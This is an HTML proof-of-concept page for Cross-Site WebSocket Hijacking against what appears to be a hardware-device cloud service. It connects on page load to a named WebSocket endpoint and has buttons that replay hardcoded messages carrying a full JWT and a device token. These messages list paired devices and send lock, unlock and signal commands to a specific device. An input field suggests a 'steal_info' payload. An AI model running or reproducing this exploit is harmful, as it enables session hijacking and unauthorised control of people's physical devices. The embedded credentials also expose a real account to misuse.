<!DOCTYPE html>
<html>
  <head>
    <title>CSWSH PoC - WebSocket Interactive</title>
    <style>
      body { font-family: monospace; padding: 20px; background: #f9f9f9; }
      #log { white-space: pre-wrap; background: #eee; padding: 10px; border-radius: 5px; margin-top: 10px; max-height: 400px; overflow-y: scroll; }
      input, button { padding: 5px 10px; font-size: 1em; margin: 5px 5px 5px 0; }
      .quick-buttons { margin-bottom: 10px; }
    </style>
  </head>
  <body>
    <h2>ğŸ’¥ CSWSH PoC - WebSocket Interactive Page</h2>

    <p>Status: <span id="status">ğŸ”Œ Connecting...</span></p>

    <div class="quick-buttons">
      <strong>Quick Requests:</strong><br/>
      <button onclick='sendQuick(`{
        \"type\":\"CONNECT\",
        \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
        \"body\":\"{\\\"mobile_device\\\":{\\\"token\\\":\\\"a36b64e823aae029647d9779b96764fc90124ff58d5f2af6b5e2cdbd1edba67a\\\",\\\"type\\\":\\\"iOS\\\",\\\"os\\\":\\\"18.2.1\\\"}}\"
      }`)'>CONNECT</button>

      <button onclick='sendQuick(`{
        \"type\":\"KEEP_ALIVE\",
        \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\"
      }`)'>KEEP_ALIVE</button>
      
      <button onclick='sendQuick(`{
        \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
        \"type\":\"REQUEST\",
        \"createdAt\":1749658438999,
        \"body\":\"{\\\"type\\\":42,\\\"data\\\":{\\\"pairedDevices\\\":[\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\"]}}\" 
      }`)'>REQUEST (pairedDevices)</button>
    </div>

    <button onclick='sendQuick(`{
      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
      \"type\": \"REQUEST\",
      \"createdAt\": 1749660165852,
      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000000}}\"
    }`)'>ğŸ”’ Lock HW Device</button>

    <button onclick='sendQuick(`{
      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
      \"type\": \"REQUEST\",
      \"createdAt\": 1749660186071,
      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000001}}\"
    }`)'>ğŸ”“ Unlock</button>

    <button onclick='sendQuick(`{
      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
      \"type\": \"REQUEST\",
      \"createdAt\": 1749660231367,
      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"dA==\\\"}}\"
    }`)'>ğŸ“¶ Signal On</button>

    <button onclick='sendQuick(`{
      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
      \"type\": \"REQUEST\",
      \"createdAt\": 1749660240142,
      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"Zg==\\\"}}\"
    }`)'>ğŸš« Signal Off</button>


    <input type="text" id="msgInput" placeholder='Type message (e.g. {"action":"steal_info"})' style="width: 80%;" />
    <button onclick="sendMsg()">Send</button>
    <button onclick="reconnect()">ğŸ”„ Reconnect</button>

    <div id="log"></div>

    <script>
      let ws;
      const logDiv = document.getElementById("log");
      const statusEl = document.getElementById("status");

      function log(msg, isJson = false) {
        const entry = document.createElement("div");
        // Add Line with timestamp like --> ----------- Timestamp: 2023-10-01 12:00:00 -----------
        const timestamp = new Date().toISOString().replace("T", " ").substring(0, 19);
        entry.style.marginBottom = "5px";
        const separator = document.createElement("div");
        separator.style.margin = "10px 0";
        separator.textContent = `----------- Timestamp: ${timestamp} -----------`;
        logDiv.appendChild(separator);
        logDiv.scrollTop = logDiv.scrollHeight;

        if (isJson) {
          try {
            const json = JSON.parse(msg);
            const pre = document.createElement("pre");
            pre.textContent = JSON.stringify(json, null, 2);
            entry.appendChild(pre);
          } catch {
            entry.textContent = msg;
          }
        } else {
          entry.textContent = msg;
        }

        logDiv.appendChild(entry);
        logDiv.scrollTop = logDiv.scrollHeight;
 

      }

      function connect() {
        ws = new WebSocket("wss://web-sdk-dev.twi-cloud-services.com/connect");

        ws.onopen = () => {
          statusEl.textContent = "âœ… Connected!";
          log("[+] Connected to WebSocket server.");
        };

        ws.onmessage = (e) => {
          log("[Server] â†’ " + e.data);
          log(e.data, true);
        };

        ws.onerror = (e) => {
          log("[!] WebSocket Error: " + JSON.stringify(e));
        };

        ws.onclose = () => {
          statusEl.textContent = "âŒ Disconnected";
          log("[x] WebSocket closed.");
        };
      }

      function sendMsg() {
        const input = document.getElementById("msgInput").value;
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(input);
          log("[You] â†’ " + input);
        } else {
          log("[!] Cannot send, WebSocket not open.");
        }
      }

      function sendQuick(payload) {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(payload);
          log("[Quick] â†’ " + payload);
          log(payload, true);
        } else {
          log("[!] WebSocket not connected.");
        }
      }

      function reconnect() {
        log("[~] Reconnecting...");
        statusEl.textContent = "ğŸ”„ Reconnecting...";
        try {
          ws.close();
        } catch {}
        connect();
      }

      connect();
    </script>
  </body>
</html>
